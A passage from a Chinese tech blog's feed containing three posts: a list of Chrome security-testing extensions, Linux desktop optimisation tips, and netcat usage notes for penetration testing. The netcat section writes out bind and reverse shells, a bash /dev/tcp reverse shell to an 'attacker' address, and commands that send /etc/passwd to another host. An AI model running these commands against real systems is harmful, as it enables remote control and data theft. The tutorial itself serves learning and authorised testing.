漏洞数据库的一款轻量级漏洞扫描程序。</p><h4 id="Go-Back-in-Time"><a href="#Go-Back-in-Time" class="headerlink" title="Go Back in Time"></a><a href="https://chrome.google.com/webstore/detail/go-back-in-time/hgdahcpipmgehmaaankiglanlgljlakj">Go Back in Time</a></h4><p>查看此页面过去的某段时间的页面缓存。</p><p><strong>基于以下缓存镜像服务：</strong></p><ul><li>CoralCDN</li><li>Google Cache</li><li>The Internet Archive</li><li>Yahoo! Cache</li><li>MSN Cache</li><li>Gigablast Cache</li><li>WebCite</li></ul><h3 id="2）HTTP-Methods"><a href="#2）HTTP-Methods" class="headerlink" title="2）HTTP Methods"></a>2）HTTP Methods</h3><h4 id="Live-HTTP-Headers"><a href="#Live-HTTP-Headers" class="headerlink" title="Live HTTP Headers"></a><a href="https://chrome.google.com/webstore/detail/http-headers/nioieekamcpjfleokdcdifpmclkohddp">Live HTTP Headers</a></h4><p>监控浏览器的所有HTTP/HTTPS流量；实时HTTP标头记录Chrome浏览器和Internet之间的所有HTTP流量。</p><h4 id="HTTP-Headers"><a href="#HTTP-Headers" class="headerlink" title="HTTP Headers"></a><a href="https://chrome.google.com/webstore/detail/http-headers/nioieekamcpjfleokdcdifpmclkohddp">HTTP Headers</a></h4><p>和上一款插件出自同一开发者，功能差不多。</p><h4 id="HTTP-Header-Spy"><a href="#HTTP-Header-Spy" class="headerlink" title="HTTP Header Spy"></a><a href="https://chrome.google.com/webstore/detail/http-header-spy/agnoocojkneiphkobpcfoaenhpjnmifb">HTTP Header Spy</a></h4><p>页面加载后立即检查请求 - 响应头和Cookie，无需额外的点击。</p><p>检查HTTP标头和响应时间，而无需打开页面检查器工具。 在您正在查看的页面中查看标题。</p><h4 id="Request-Maker"><a href="#Request-Maker" class="headerlink" title="Request Maker"></a><a href="https://chrome.google.com/webstore/detail/request-maker/kajfghlhfkcocafkcjlajldicbikpgnp">Request Maker</a></h4><p>Request Maker是一种渗透测试工具。可以轻松捕获网页发出的请求，篡改URL，标题和POST数据，当然还可以发出新请求。Request Maker仅捕获通过HTML表单和XMLHttpRequests发送的请求。</p><h4 id="Requestly"><a href="#Requestly" class="headerlink" title="Requestly"></a><a href="https://chrome.google.com/webstore/detail/requestly-redirect-url-mo/mdnleldcmiljblolnjhpnblkcekpdkpa">Requestly</a></h4><p>修改HTTP请求（安装程序重定向，运行自定义Javascript，修改标题）</p><p><strong>主要功能：</strong></p><ul><li>修改请求 URL</li><li>User Scripts（类似 TamperMonkey）</li><li>修改 HTTP 请求和响应标头</li><li>修改 User Agent</li><li>………… </li></ul><h3 id="3）Developer-Tools"><a href="#3）Developer-Tools" class="headerlink" title="3）Developer Tools"></a>3）Developer Tools</h3><h4 id="Firebug-Lite"><a href="#Firebug-Lite" class="headerlink" title="Firebug Lite"></a><a href="https://chrome.google.com/webstore/detail/firebug-lite-for-google-c/ehemiojjcpldeipjhjkepfdaohajpbdo">Firebug Lite</a></h4><p>简单的开发者工具，控制台查看请求方式（GET、POST……）</p><ul><li>支持控制台</li><li>HTML</li><li>CSS</li><li>Script</li><li>DOM</li></ul><h4 id="Web-developer"><a href="#Web-developer" class="headerlink" title="Web developer"></a><a href="https://chrome.google.com/webstore/detail/web-developer/bfbameneiokkgbdmiekhjnmfkcnldhhm">Web developer</a></h4><p>Web Developer扩展将各种Web开发人员工具添加到浏览器中，支持</p><ul><li>禁用各种脚本、插件等等</li><li>Cookie 管理</li><li>禁用各种 CSS 样式</li><li>…………</li></ul><h3 id="4）好评工具"><a href="#4）好评工具" class="headerlink" title="4）好评工具"></a>4）好评工具</h3><h4 id="d3coder"><a href="#d3coder" class="headerlink" title="d3coder"></a><a href="https://chrome.google.com/webstore/detail/d3coder/gncnbkghencmkfgeepfaonmegemakcol">d3coder</a></h4><p>编码\解码 Chrome 插件，右击选中的文本进行各种类型的编码或者解码。</p><p><strong>支持：</strong></p><ul><li>Unix时间戳</li><li>rot13</li><li>base64</li><li>CRC32 / MD5 / SHA1散列</li><li>bin2hex</li><li>bin2txt</li><li>HTML实体</li><li>HTML specialchars</li><li>URI编码</li><li>引用的印刷品</li><li>Escapeshellarg</li><li>（PHP）反序列化</li><li>“L33T” - 说话</li><li>反向</li></ul><h4 id="HackBar"><a href="#HackBar" class="headerlink" title="HackBar"></a><a href="https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc">HackBar</a></h4><p>好用不解释！！！</p><p><strong>Features：</strong></p><ul><li>GET、POST……</li><li>SQLi</li><li>XSS</li><li>LFI</li><li>Encoding</li><li>Hashing</li></ul><h4 id="User-Agent-Switcher-and-Manager"><a href="#User-Agent-Switcher-and-Manager" class="headerlink" title="User-Agent Switcher and Manager"></a><a href="https://chrome.google.com/webstore/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg">User-Agent Switcher and Manager</a></h4><p>User-Agent 切换管理器，支持自定义。</p><p><img src="/" class="lazyload" data-src="https://cdn.add0n.com/images/useragent-switcher-big.png"  alt="User-Agent Switcher"></p><p><strong>Notice：</strong></p><p><a href="https://add0n.com/useragent-switcher.html">Spoofs and mimics browser’s User-Agent strings</a></p><h4 id="EditThisCookie"><a href="#EditThisCookie" class="headerlink" title="EditThisCookie"></a><a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg">EditThisCookie</a></h4><p>这是一款 Cookie 管理器，支持增删改查、锁定、屏蔽 Cookie。</p><ul><li>编辑cookies</li><li>删除cookies</li><li>添加一个新的cookie</li><li>创建cookies</li><li>搜索cookies</li><li>保护cookies (只读cookies)</li><li>拦截cookies (cookie 过滤器)</li><li>导出cookies为JSON, Netscape cookie 文档 (非常适合wget及curl), Perl::LPW</li><li>导入JSON格式cookies</li><li>限制任何cookie的最大有效期</li><li>改进性能，移除旧的cookies</li><li>导入cookies.txt</li></ul><h2 id="0x03-其他-Others"><a href="#0x03-其他-Others" class="headerlink" title="0x03 其他 | Others"></a>0x03 其他 | Others</h2><h4 id="Tampermonkey"><a href="#Tampermonkey" class="headerlink" title="Tampermonkey"></a><a href="https://github.com/Tampermonkey/tampermonkey">Tampermonkey</a></h4><p> 这款脚本管理器插件大部分人都比较清楚；油猴用于运行所谓的 userscripts。</p><p><strong>Find Scripts：</strong></p><p><a href="https://www.tampermonkey.net/scripts.php">tampermonkey.net/scripts.php</a></p><p><strong>墙推：</strong></p><p><a href="%5Bhttps://greasyfork.org%5D(https://greasyfork.org/)">Greasy Fork</a></p><p>很强大！！！</p><h4 id="HTTPS-Everywhere"><a href="#HTTPS-Everywhere" class="headerlink" title="HTTPS Everywhere"></a>HTTPS Everywhere</h4><p>一款保护自身安全的浏览器插件；加密网络浏览，自动使用 HTTPS 连接访问站点，更加安全。</p><h4 id="Privacy-Badger"><a href="#Privacy-Badger" class="headerlink" title="Privacy Badger"></a><a href="https://chrome.google.com/webstore/detail/privacy-badger/pkehgijcmpdhfbdbbnkijodmdjhbjlgp">Privacy Badger</a></h4><p>此扩展插件自动保护用户隐私，免受用户浏览网页时无形加载的第三方跟踪器的侵害。开发者 EFF（电子前沿基金会）针对每个请求发送 <a href="https://www.eff.org/dnt-policy">Do Not Track</a>。</p><h4 id="ScriptSafe"><a href="#ScriptSafe" class="headerlink" title="ScriptSafe"></a><a href="https://github.com/andryou/scriptsafe">ScriptSafe</a></h4><p>限制 JavaScript 脚本语言的权限，以保护用户。</p><p>最开始是在 Tor 浏览器中了解到这个插件的。</p><p><strong>Notice：</strong><a href="https://www.andryou.com/scriptsafe/">ScriptSafe</a></p><h4 id="Secure-Shell-Extension"><a href="#Secure-Shell-Extension" class="headerlink" title="Secure Shell Extension"></a><a href="https://chrome.google.com/webstore/detail/secure-shell-extension/iodihamcpbpeioajjeobimgagajmlibd">Secure Shell Extension</a></h4><p>Google 官方推出的一款终端仿真器和SSH和SFTP客户端。</p><h4 id="谷歌访问助手破解版"><a href="#谷歌访问助手破解版" class="headerlink" title="谷歌访问助手破解版"></a><a href="https://github.com/haotian-wang/google-access-helper">谷歌访问助手破解版</a></h4><p>已破解的<strong>谷歌访问助手</strong>，在我的其他代理工具失效时拿来临时使用。🤤</p>]]></content>
      
      
      
        <tags>
            
            <tag> Chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux桌面性能瓶颈优化</title>
      <link href="2019/04/26/linux-optimization/"/>
      <url>2019/04/26/linux-optimization/</url>
      
        <content type="html"><![CDATA[<blockquote><p>将曾经使用 Ubuntu 的经验记录下来，并分享出去。</p><p>当然此文并不限于 Ubuntu。</p></blockquote><h2 id="0x00-SSD-硬盘"><a href="#0x00-SSD-硬盘" class="headerlink" title="0x00 SSD 硬盘"></a>0x00 SSD 硬盘</h2><h3 id="分区对齐"><a href="#分区对齐" class="headerlink" title="分区对齐"></a>分区对齐</h3><p>关于如今的固态硬盘，已不再需要手动分区对齐。因为目前主流 Linux 系统都已自动对齐文件系统和分区【<strong>页面大小4096字节</strong>】。</p><h3 id="优化原则"><a href="#优化原则" class="headerlink" title="优化原则"></a>优化原则</h3><p>由于频繁写操作会磨损固态硬盘，所以对于其优化原则就是：【<strong>尽量减少写操作</strong>】。</p><span id="more"></span><h3 id="文件系统类型"><a href="#文件系统类型" class="headerlink" title="文件系统类型"></a>文件系统类型</h3><p>而对于文件系统类型，墙裂推荐【<strong>EXT4</strong>】，EXT4 文件系统的日志会对硬盘多产生一些写操作，但不会太多；</p><h3 id="禁用写操作"><a href="#禁用写操作" class="headerlink" title="禁用写操作"></a>禁用写操作</h3><h4 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h4><p>操作系统在对于文件读取时，同时还会对文件的时间戳进行一个写操作；而这个写操作的意义是很小的，所以关闭。</p><p>编辑分区表，为你的<strong>根分区</strong>和 <strong>Home 分区</strong> 都增加 noatime 选项。</p><pre><code class="shell">$ sudo vim /etc/fstab</code></pre><p>如下，由于我并没有将 <strong>Home</strong> 分区单独分出来，所有仅在 / 分区的 <em>options</em> 位置添加了 <strong>noatime</strong>。</p><pre><code class="bash"># &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;# /dev/sda1UUID=4a7fcb3e-fdcc-4c03-9ee3-de3c5ds3da30    /             ext4          noatime,rw,relatime    0 1# /dev/sda2UUID=F06E-6942          /boot/EFI     vfat          rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,utf8,errors=remount-ro    0 2# /dev/sda3UUID=c9e9e9d5-cde4-4ab4-adf9-027d56384e10    none          swap          defaults      0 0</code></pre><h4 id="禁用休眠"><a href="#禁用休眠" class="headerlink" title="禁用休眠"></a>禁用休眠</h4><p>计算机休眠挂起会导致磁盘进行大量的写操作，不过 Ubuntu 默认关闭。</p><h4 id="碎片整理"><a href="#碎片整理" class="headerlink" title="碎片整理"></a>碎片整理</h4><p>Linux 下<strong>不必要进行碎片整理</strong>，非但不必要，而且还得<strong>避免碎片整理</strong>。碎片整理会导致大量的写操作，对 SSD 是致命伤害。</p><h3 id="TRIM-定期清理磁盘"><a href="#TRIM-定期清理磁盘" class="headerlink" title="TRIM 定期清理磁盘"></a>TRIM 定期清理磁盘</h3><p>Ubuntu 默认已经安装 TRIM，可通过一下命令查看是否支持。</p><pre><code class="bash">$ sudo hdparm -I /dev/sda | grep TRIM       *    Data Set Management TRIM supported (limit 8 blocks)       *    Deterministic read ZEROs after TRIM</code></pre><p>查看服务状态：</p><pre><code class="bash">$ sudo systemctl status fstrim.service● fstrim.service - Discard unused blocks on filesystems from /etc/fstab   Loaded: loaded (/usr/lib/systemd/system/fstrim.service; static; vendor preset: disabled)   Active: inactive (dead)     Docs: man:fstrim(8)</code></pre><p>此服务是关闭状态；因为默认一周清理一次，没必要时时对硬盘进行清理。</p><p>指定根分区节点，手动清理：</p><pre><code class="bash">$ sudo fstrim -v /</code></pre><p>自定义每日清理：</p><pre><code class="bash">$ sudo mkdir -v /etc/systemd/system/fstrim.timer.d$ sudo vim /etc/systemd/system/fstrim.timer.d/override.conf</code></pre><p>添加如下几行：</p><pre><code class="bash">[Timer]OnCalendar=OnCalendar=daily</code></pre><h3 id="硬盘缓存"><a href="#硬盘缓存" class="headerlink" title="硬盘缓存"></a>硬盘缓存</h3><p>所谓缓存，其本质上就是一块内存空间；缓存机制会在 CPU 读取硬盘数据之前，提前将数据放入缓存之中；CPU 需要读取数据时，从而可以从缓存之中读取数据，进而从整体上提高系统的运行效率。此处缓存所指<strong>写缓存</strong>。</p><p>程序在运行中，会等待数据在写入到硬盘之后才会进行下一步操作。因为数据如果不写入至硬盘，还停留在内存中，一旦断电内存中的数据就会丢失。Ubuntu 默认没有开启写缓存；而对于有电源的笔记本，这是不必要的。所以建议笔记本 Linux 用户开启写缓存。PC 台式机谨慎！！！</p><p>打开 【<strong>Disks</strong>】工具，先在左侧选择你的磁盘，然后点击右上角。找到【<strong>Drive Setting</strong>】开启【<strong>Enable Write Cache</strong>】</p><p><img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g2h32g0vchj30q70hp74r.jpg"  alt="Enable Write Cache"></p><h2 id="0x01-CPU"><a href="#0x01-CPU" class="headerlink" title="0x01 CPU"></a>0x01 CPU</h2><h3 id="安装微码"><a href="#安装微码" class="headerlink" title="安装微码"></a>安装微码</h3><p>介于 CPU 的完全，建议安装微码安全补丁。</p><p><strong>Intel</strong></p><pre><code class="bash">$ sudo apt install intel-microcode</code></pre><p><strong>AMD</strong></p><pre><code class="bash">$ sudo apt install amd64-microcode</code></pre><h3 id="温度监视"><a href="#温度监视" class="headerlink" title="温度监视"></a>温度监视</h3><p>安装一个温度监视器。</p><pre><code class="bash">$ sudo apt install lm-sensors</code></pre><p>查看：</p><pre><code class="bash">$ sensors coretemp-isa-0000Adapter: ISA adapterPackage id 0:  +32.0°C  (high = +100.0°C, crit = +100.0°C)Core 0:        +30.0°C  (high = +100.0°C, crit = +100.0°C)Core 1:        +30.0°C  (high = +100.0°C, crit = +100.0°C)acpitz-acpi-0Adapter: ACPI interfacetemp1:        +32.0°C  (crit = +103.0°C)nouveau-pci-0100Adapter: PCI adapterGPU core:     +0.60 V  (min =  +0.60 V, max =  +1.20 V)iwlwifi-virtual-0Adapter: Virtual devicetemp1:        +27.0°C  pch_skylake-virtual-0Adapter: Virtual devicetemp1:        +27.5°C  </code></pre><h2 id="0x02-内存优化"><a href="#0x02-内存优化" class="headerlink" title="0x02 内存优化"></a>0x02 内存优化</h2><h3 id="限制-inode-缓存"><a href="#限制-inode-缓存" class="headerlink" title="限制 inode 缓存"></a>限制 <strong>inode</strong> 缓存</h3><p>其实我也不太懂这是啥，便从维基上抄了下面这句话。</p><blockquote><p><strong>inode</strong>是指在许多“类<a href="https://zh.wikipedia.org/wiki/Unix">Unix</a><a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a>”中的一种<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">数据结构</a>。每个inode保存了文件系统中的一个<strong>文件系统对象</strong>（包括<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%96%87%E4%BB%B6">文件</a>、<a href="https://zh.wikipedia.org/wiki/%E7%9B%AE%E5%BD%95_(%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F)">目录</a>、<a href="https://zh.wikipedia.org/wiki/%E8%AE%BE%E5%A4%87%E6%96%87%E4%BB%B6">设备文件</a>、<a href="https://zh.wikipedia.org/wiki/Unix%E5%9F%9F%E5%A5%97%E6%8E%A5%E5%AD%97">socket</a>、<a href="https://zh.wikipedia.org/wiki/%E7%AE%A1%E9%81%93_(Unix)">管道</a>, 等等）的元信息数据，但不包括数据内容或者文件名[<a href="https://zh.wikipedia.org/wiki/Inode#cite_note-1">1]</a>。</p></blockquote><p>还是建议内存大一点的限制 <strong>inode</strong> 缓存，多大呢？大于4G吧。</p><p>某些系统项将在内存中保留更长的时间。可使计算机速度有明显的提升。</p><pre><code class="bash">$ sudo vim /etc/sysctl.conf</code></pre><p>添加如下配置至尾行：</p><pre><code class="bash">vm.vfs_cache_pressure=50</code></pre><h3 id="Tmp-放入内存"><a href="#Tmp-放入内存" class="headerlink" title="Tmp 放入内存"></a>Tmp 放入内存</h3><p>Tmp 目录用于存放一些中间临时数据的目录，但是其位于硬盘，如果将其放入内存(Tmpfs)中，会大大提高一些数据读写的效率。还是建议内存大于8G的这么做。</p><pre><code class="bash">$ sudo cp -v /usr/share/systemd/tmp.mount /etc/systemd/system/$ sudo systemctl enable tmp.mount</code></pre><p>重启生效，查看状态：</p><pre><code class="bash">$ systemctl status tmp.mount ● tmp.mount - /tmp   Loaded: loaded (/etc/fstab; generated)   Active: active (mounted) since Sat 2019-04-27 10:57:47 CST; 1h 20min ago    Where: /tmp     What: tmpfs     Docs: man:fstab(5)           man:systemd-fstab-generator(8)    Tasks: 0 (limit: 4915)   Memory: 32.0K   CGroup: /system.slice/tmp.mountApr 27 10:57:47 4rch systemd[1]: Mounting /tmp...Apr 27 10:57:47 4rch systemd[1]: Mounted /tmp.</code></pre><p>如何取消呢？只需将此文件删除即可。</p><pre><code class="bash">$ sudo rm -v /etc/systemd/system/tmp.mount</code></pre><h2 id="0x03-SWAP-分区"><a href="#0x03-SWAP-分区" class="headerlink" title="0x03 SWAP 分区"></a>0x03 SWAP 分区</h2><p>由于内存的有限，所有当运行一个很大的程序时，系统会将一部分内存交换至 swap 交换分区中； swap 分区即为硬盘，与内存相比较，在速度上是有很大的差距的。</p><p>而且 Ubuntu 默认当还剩60%内存时就开始将一部分内存交换至 swap 分区中。</p><pre><code class="bash">$ cat /proc/sys/vm/swappiness 60</code></pre><p>修改 swappiness 参数。</p><pre><code class="bash">$ sudo vim /etc/sysctl.conf</code></pre><p>添加以下参数至以上配置文件的尾行。这个数值只是一个百分百，可以按照自己的需求自定义。</p><pre><code class="bash">vm.swappiness=10</code></pre><h2 id="0x04-显示撕裂"><a href="#0x04-显示撕裂" class="headerlink" title="0x04 显示撕裂"></a>0x04 显示撕裂</h2><p>在正确安装 NVIDIA 显卡驱动之后，依旧有时候会出现窗口撕裂的现象。（AMD 貌似没有这回事）</p><p>这时就需要编辑 grub 配置文件来解决。</p><pre><code class="bash">$ sudo vim /etc/default/grub</code></pre><p>修改以下一行配置：</p><pre><code class="bash">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet&quot;</code></pre><p>在 <code>quiet</code> 后增加 <code>nvidia-drm.modeset=1</code>，如下。</p><pre><code class="bash">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet nvidia-drm.modeset=1&quot;</code></pre><p>然后更新 <strong>grub</strong>，重启生效。</p><pre><code class="bash">$ update-grub &amp;&amp; reboot</code></pre><p>验证：</p><pre><code class="bash">$ xrandr --verbose | grep PRIME    PRIME Synchronization:1    PRIME Synchronization:1</code></pre><h2 id="0x05-启动项优化"><a href="#0x05-启动项优化" class="headerlink" title="0x05 启动项优化"></a>0x05 启动项优化</h2><p>Linux 下很多启动(开机自启)项默认都是隐藏状态；使用一条替换命令，显示所有启动项。</p><pre><code class="bash">$ sudo sed -i &#39;s/NoDisplay=true/NoDisplay=false/g&#39; /etc/xdg/autostart/*.desktop</code></pre><p>然后打开 <strong>Startup Applications</strong>，按照个人需求自定义关闭不需要的启动项。</p><h2 id="0x06-浏览器优化"><a href="#0x06-浏览器优化" class="headerlink" title="0x06 浏览器优化"></a>0x06 浏览器优化</h2><h3 id="限制-Firefox-写操作"><a href="#限制-Firefox-写操作" class="headerlink" title="限制 Firefox 写操作"></a>限制 Firefox 写操作</h3><p>将 Firefox 网络缓存放入内存中，可提高运行速度；</p><p>首先打开 Firefox，在浏览器地址栏输入：</p><pre><code class="firefox">about:config</code></pre><p>回车，点击<code>I accept the risk</code>。</p><p>搜索 <code>「browser.cache.disk.enable」</code>，双击将 <strong>Value</strong> 由 <code>true</code>变为<code>false</code>。</p><p>再次搜索<code>「browser.cache.memory.enable」</code>，将 <strong>Value</strong> 变为<code>true</code>。</p><p>再然后右击，点击<code>New</code>，选择<code>Integer</code>，输入<code>「browser.cache.memory.capacity」</code>，点击 <strong>OK</strong>，输入值<code>204800</code>。</p><h3 id="禁用-Firefox-sessionstore"><a href="#禁用-Firefox-sessionstore" class="headerlink" title="禁用 Firefox sessionstore"></a>禁用 Firefox sessionstore</h3><p>由于恢复 Firefox 意外崩溃的回话会导致大量的写操作，这对于 SSD 硬盘是很受伤的，所以建议关闭。</p><p>搜索 <code>「browser.sessionstore.interval」</code>，将原来的值<code>15000</code>修改为<code>15000000</code>。</p><h3 id="禁用无必要网络访问"><a href="#禁用无必要网络访问" class="headerlink" title="禁用无必要网络访问"></a>禁用无必要网络访问</h3><p>对于使用 Firefox 来进行 Web 应用程序截断代理、漏洞挖掘。使用过 <strong>BurpSuite</strong> 就会知道，可能经常会抓到一些其他无相关的站点的数据包， 这是 Firefox 在后台偷偷地去请求一个网址。</p><p>搜索<code>「network.captive-portal-service.enabled」</code>，双击将 <strong>Value</strong> 由 <code>true</code>变为<code>false</code>。</p><h3 id="限制-Chrome-写操作"><a href="#限制-Chrome-写操作" class="headerlink" title="限制 Chrome 写操作"></a>限制 Chrome 写操作</h3><p><code>Settings</code>—-&gt;<code>Advanced</code>—-&gt;<code>Privacy</code>—-&gt;<code>Use a prediction service to load pages more quickly</code></p><p>关闭此项。</p><h2 id="0x07-系统清理"><a href="#0x07-系统清理" class="headerlink" title="0x07 系统清理"></a>0x07 系统清理</h2><p>清理系统不需要的缓存等等</p><pre><code class="bash">$ sudo apt autoremove$ sudo apt autoclean</code></pre><p>不得不承认这两条命令清理的并不彻底。</p><h3 id="Stacer"><a href="#Stacer" class="headerlink" title="Stacer"></a>Stacer</h3><p><strong>Github：</strong><a href="https://github.com/oguzhaninan/Stacer">github.com/oguzhaninan/Stacer</a></p><p>从仓库主页 <strong>releases</strong> 中找到以 <strong>.deb</strong> 结尾的软件包，下载并安装。这款软件是图形化操作，界面比较友好。</p><pre><code class="bash">$ sudo dpkg -i stacer_1.0.9_amd64.deb</code></pre><h3 id="Bleachbit"><a href="#Bleachbit" class="headerlink" title="Bleachbit"></a>Bleachbit</h3><p>这款软件貌似系统自带，搜索打开即可使用。其界面并没有 <strong>Stacer</strong> 那么友好，但清理的特别彻底。</p><p>关于系统清理，如果操作不当；轻则破坏你的个性化设置，严重可能会导致系统崩溃。请谨慎操作！！！</p><h2 id="0x08-优化电池寿命"><a href="#0x08-优化电池寿命" class="headerlink" title="0x08 优化电池寿命"></a>0x08 优化电池寿命</h2><p>使用的是一种简单的办法。</p><p>安装一个软件包，并将电池优化的工作交给它。</p><pre><code class="bash">$ sudo apt install tlp tlp-rdw</code></pre><p>然后启动它：</p><pre><code class="bash">$ sudo tlp startTLP started in AC mode.</code></pre><p>查看 <strong>tlp</strong> 状态：</p><pre><code class="bash">$ sudo tlp-stat</code></pre><h4 id="……"><a href="#……" class="headerlink" title="……"></a>……</h4>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>瑞士军刀NETCAT使用笔记</title>
      <link href="2019/04/20/NETCAT-%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>2019/04/20/NETCAT-%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h2><ul><li>网络工具中的瑞士军刀</li><li>侦听模式、传输模式</li><li>Telnet、获取Banner信息</li><li>传输即时文本信息、文件、目录</li><li>加密传输文件</li><li>远程控制、木马</li><li>加密所有流量</li><li>远程克隆硬盘</li><li>流媒体服务器</li></ul><span id="more"></span><h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><pre><code class="BASH">$ nc -nv 192.168.43.218 80</code></pre><pre><code class="shell">-n 后面跟IP地址，且不做域名解析-v 显示详细信息内容</code></pre><h2 id="信息传输"><a href="#信息传输" class="headerlink" title="信息传输"></a>信息传输</h2><h3 id="文本传输"><a href="#文本传输" class="headerlink" title="文本传输"></a>文本传输</h3><ul><li><p>服务端：</p><pre><code class="shell">$ nc -l -p 4444-l 打开、侦听一个端口-p 端口</code></pre></li><li><p>客户端：</p><pre><code class="shell">$ nc -nv 192.168.43.218 4444Connection to 192.168.43.218 4444 port [tcp/*] succeeded!</code></pre></li></ul><h3 id="电子取证"><a href="#电子取证" class="headerlink" title="电子取证"></a>电子取证</h3><p>电子取证的原则就是尽量减少在被审计端的操作。</p><ul><li><p>审计端：</p><pre><code class="shell">$ nc -l -p 4444 &gt; ps.txt</code></pre></li><li><p>被审计端：</p><p>```shell<br>$ ps aux | nc -nv 192.168.43.8 4444 -q 1</p></li><li><p>q 后面跟秒数，代表传输完成后多少秒断开连接</p><pre><code></code></pre></li></ul><p>将进程信息由被审计端传到审计端。</p><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><ul><li><p>接受端</p><pre><code class="shell">$ nc -lp 4444 &gt; passwd.txt</code></pre></li><li><p>发送端</p><pre><code class="shell">$ nc -nv 192.168.43.8 &lt; /etc/passwd -q 1</code></pre></li></ul><p><strong>或者：</strong></p><ul><li><p>接收端</p><pre><code class="shell">$ nc -q 1 -lp 4444 &gt; passwd.txt</code></pre></li><li><p>发送端</p><pre><code class="shell">$ nc -nv 192.168.43.8 4444 &lt; /etc/passwd</code></pre></li></ul><h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>其实就是调用系统其他程序来完成功能的实现，包括下面的加密传输……</p><ul><li><p>发送端</p><pre><code class="shell">$ tar -cvf - /var/www/html/dvwa/ | nc -lp 4444 -q 1</code></pre></li><li><p>接受端</p><pre><code class="shell">$ nc 192.168.43.218 4444 | tar -xvf -</code></pre></li></ul><h2 id="加密传输"><a href="#加密传输" class="headerlink" title="加密传输"></a>加密传输</h2><ul><li><p>接受端</p><pre><code class="shell">$ nc -lp 4444 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; passwd.txt</code></pre></li><li><p>发送端</p><pre><code class="shell">$ mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; /etc/passwd | nc -nv 192.168.43.8 4444 -q 1Enter the passphrase (maximum of 512 characters)Connection to 192.168.43.8 4444 port [tcp/*] succeeded!Please use a combination of upper and lower case letters and numbers.Enter passphrase: 000000Enter passphrase: 000000</code></pre></li></ul><h2 id="流媒体服务"><a href="#流媒体服务" class="headerlink" title="流媒体服务"></a>流媒体服务</h2><ul><li><p>服务端</p><pre><code class="bash">$ cat vlc.mp4 | nc -lp 4444</code></pre></li><li><p>客户端</p><pre><code class="shell">$ nc -nv 192.168.43.218 4444 | mplayer -vo x11 -cache 3000 -</code></pre></li></ul><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code class="bash">$ nc -nvz 192.168.43.218 1-1024-z 端口扫描，无I/O输出模式</code></pre><pre><code class="bash">$ nc -vnzu 192.168.43.218 1-1024-u 探测UDP流量，默认TCP</code></pre><h2 id="远程硬盘克隆"><a href="#远程硬盘克隆" class="headerlink" title="远程硬盘克隆"></a>远程硬盘克隆</h2><p>调用系统命令 <code>dd</code> 来完成硬盘的克隆，从被取证端的 <code>sda</code> 磁盘克隆至取证端的 <code>sda</code> 磁盘。</p><ul><li><p>取证端</p><pre><code class="bash">$ nc -lp 4444 | dd of=/dev/sda</code></pre></li><li><p>被取证端</p><pre><code class="bash">$ dd if=/dev/sda | nc -nv 192.168.43.218 4444 -q 1</code></pre></li></ul><h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><h3 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h3><ul><li><p>被控制端</p><p>ubuntu 默认无 -e 参数；首先先修复nc，调出 -e 参数。</p><pre><code class="bash">$ sudo rm /etc/alternatives/nc &amp;&amp; sudo ln -s /bin/nc.traditional /etc/alternatives/nc</code></pre><pre><code class="shell">$ nc -lp 4444 -e /bin/bash</code></pre></li><li><p>控制端</p><pre><code class="bash">$ nc -nv 192.168.43.218 4444</code></pre></li></ul><h3 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h3><ul><li><p>控制端</p><pre><code class="bash">$ nc -lp 4444</code></pre></li><li><p>被控制端</p><pre><code class="bash">$ nc -nv 192.168.43.8 4444 -e /bin/bash</code></pre></li></ul><h3 id="Shell-反弹"><a href="#Shell-反弹" class="headerlink" title="Shell 反弹"></a>Shell 反弹</h3><p>实际渗透测试中，目标主机 nc 或可能没有、不支持 -e 参数；这时就需要以下方式：</p><ul><li><p>攻击者（192.168.1.108）</p><pre><code class="shell">$ nc -lvvp 4444# 两个参数 v 代表显示更详细的信息。</code></pre></li><li><p>目标主机</p><pre><code class="shell">$ bash -i &gt;&amp; /dev/tcp/192.168.1.108/4444 0&gt;&amp;1</code></pre><p>命令解释：</p><pre><code class="shell">bash -i          产生一个交互式shell。&gt;&amp;               将联合符号(&amp;)前后内容相结合重定(&gt;)向至后者。/dev/tcp/ip/port linux中所有内容(设备、网络等)都被抽象成一个文件的形式而存在，这里意思就是对socket网络连接的一个抽象。0&gt;&amp;1        将标准输入和标准输出内容相结合，然后重定向至标准输出内容。         0 标准输入           1 标准输出         2 错误输出 </code></pre><p>整条命令的意思就是：bash 产生一个本地交互 shell 主动发起与攻击者(192.168.1.108)4444端口建立连接，重定向 